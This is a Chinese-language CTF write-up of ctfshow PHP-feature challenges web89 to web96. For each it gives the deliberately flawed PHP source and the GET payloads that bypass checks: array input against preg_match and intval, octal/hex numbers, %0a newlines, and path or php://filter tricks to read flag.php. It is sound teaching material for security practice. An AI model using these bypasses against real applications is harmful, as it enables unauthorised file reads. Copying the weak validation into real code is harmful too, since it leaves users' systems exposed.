    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 15:38:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看一下 <u>intval</u> 函数说明,就可以知道使用数组来绕过</p><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/89-1.jpg"></p><p>进一步查看，可以知道 <u>preg_match</u> 是无法处理数组的</p><p>利用 <u>preg_match()</u> 函数无法处理数组的漏洞</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?num[]=<span class="hljs-number">9</span><br>?num[]=<br></code></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(iseet(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道</p><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/90-1.jpg"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">0x117c</span><br>?num=<span class="hljs-number">010574</span><br>?num=<span class="hljs-number">4476</span>a <span class="hljs-comment">//a可以为任意字母</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/90-flag.php"></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:16:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^php$i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125;<br><br>Notice: Undefined index: cmd in /<span class="hljs-keyword">var</span>/www/html/index.php on line <span class="hljs-number">15</span><br>nonononono<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    1.正则表达式：/^php$/im:</p><p>​        ^:匹配输入字符串的开始位置</p><p>​        $:匹配输入字符串的结尾位置</p><p>​        i:不区分大小写</p><p>​        m:多行匹配，使边界字符串为 php 才能为针进入此if中</p><p>​    2.正则表示 /^php$/i: 与上一个正则相比少了多行匹配。所以突入点就是这个 m </p><p>​    3.第二个 if 语句不能满足才能得到 flag 的意思就是 第二个 if 他不能匹配到这个字符串 php</p><p>​    4.第一个 if 语句多行匹配到字符串 php </p><p>​    5. 因此得让第一个多行匹配能匹配到字符串 php 而第二个不能匹配到字符串 php 就得让第一行为 php 第二行或第三行不为 php,所以这题需要使用到 <code>%0a</code> </p><p><strong>实验：</strong></p><p>​    1.直接输入 <code>php</code> 效果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=php<br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/91-1.jpg"></p><p>​    2.使用 <code>回车(%0a)</code> 后</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=php%0a123<br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/91-2.jpg"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析:</strong></p><p>​    1.    intval() 获取变量的整数值， <strong>intval</strong> (mixed )</p><p>​    2.    使用指定进制 base 转换(默认十进制)base是0，检测 var 的格式来决定使用的进制；</p><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/92-1.jpg"></p><ol start="3"><li>   if(intval($num,0)==4476){echo $flag;} 此处 == 为若比较，只比较数值，不比较类型，那么将4476转换为八进制(010574)或十六进制(0x117c)，就能使比较成立并得到flag</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">0x117c</span><br>?num=<span class="hljs-number">010574</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/92-2.jpg"></p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:32:58</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    1.比较上一题，多了正则匹配了 <strong>字母</strong>，那么六进制 0x 将失效</p><p>​    2.八进制(010574)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">010574</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/93-1.jpg"></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:46:19</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!strpos(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这题中出现了新的函数 <strong>strpos</strong> ,百度查意思</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strpos</span><span class="hljs-params">()</span></span> 函数查找字符串在另一字符串中第一次出现的位置<br>返回值：返回字符串在另一个字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。 字符串位置从<span class="hljs-number">0</span>开始，不是从 <span class="hljs-number">1</span> 开始<br></code></pre></td></tr></table></figure><p>对于strpos()函数，我们可以利用换行进行绕过(%0a)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=%0a010574<br></code></pre></td></tr></table></figure><p>也可以使用小数点绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=4476.0<br></code></pre></td></tr></table></figure><p>因为inval()函数只读取整数部分</p><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/94-1.jpg"></p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 16:53:59</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!strpos(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>​    这题相较上一题多了小数点的过滤</p><p>​    strops()可以用 %0a(换行),%20(空格),%2b(+),空格 绕过</p><p>​    因为过滤了字母，所以此题只能使用八进制形式。</p><p>​    %0a010574    %20010574( 010574)    %2b010574(+010574)</p><p>payload:</p><p>​    <img src="/2021/11/11/php%E7%89%B9%E6%80%A7/95-1.jpg"></p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 19:21:24</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        highlight_file(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><pre><code> 1.    if GET 到的字符串为 flag.php 则会停止 2.    而整个代码，最后 highlight_file() 在 else 上，那么 GET 到的 u 必须为 FALSE 才能执行 else ，但是 U 不能等于 flag.php；不过 highlight_file()  使用路径，那么就有：./flag.php 表示当前目录下的文件，或者绝对路径：/var/www/html/flag.php,或者php伪协议 ：php://filter/resource=flag.php </code></pre><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?u=./flag.php<br>?u=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br>?u=php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/96-1.jpg"></p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
